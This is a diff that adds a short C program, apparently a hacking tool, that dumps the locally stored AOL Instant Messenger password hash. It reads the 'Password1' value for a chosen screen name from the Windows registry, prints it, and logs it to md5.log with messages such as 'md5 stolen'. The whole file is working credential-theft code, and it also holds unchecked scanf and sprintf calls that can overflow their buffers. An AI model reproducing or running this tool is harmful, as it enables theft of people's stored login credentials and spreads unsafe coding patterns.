@@ -1,0 +1,53 @@
+/*********************
+ Aim hash dump script
+ coded by: NoUse
+*********************/
+#include <stdio.h>
+#include <windows.h>
+
+int main(void)
+{
+    HKEY hKey;
+    long lRet;
+    unsigned char dwData[1000];
+    DWORD dwSize = 1000;
+
+    char buffer[150];
+    char user_name[24];
+   
+    FILE *log;
+    log = fopen("md5.log", "a");
+   
+    memset(buffer, '\0', 150);
+    memset(user_name, '\0', 24);
+   
+    printf("\n-------------------------");
+    printf("\n| AIM (local) hash dump |");
+    printf("\n| coded by: Nouse       |");
+    printf("\n-------------------------\n");
+    printf("\nTo use, input screen name of the hash you want");
+    printf("\n\tUsername: ");
+    scanf("%s",user_name);
+   
+    sprintf(buffer, "Software\\America Online\\AOL Instant Messenger (TM)\\CurrentVersion\\Users\\%s\\Login\\", user_name);
+   
+    if ((lRet = RegOpenKeyEx(HKEY_CURRENT_USER, buffer, 0, KEY_ALL_ACCESS, &hKey)) != ERROR_SUCCESS)
+    {
+      printf("\n[-] Unable to query registry key.\n");
+      return -1;
+    }
+   
+    if ((lRet = RegQueryValueEx(hKey, "Password1", NULL, 0, dwData, &dwSize)) != ERROR_SUCCESS)
+    {
+      RegCloseKey(hKey);
+      printf("[-]Unable to get passw3rd. No haxing for you today!\n");
+      return -1;
+    }
+      
+    printf("[+] md5 hash is: %s\n",dwData);
+    printf("[~] printing to log file \"md5.log\"\n");
+    printf("[+] success! md5 stolen.\n");
+    fwrite(dwData, 1, strlen(dwData), log);
+    fclose(log);
+    return 0;
+}
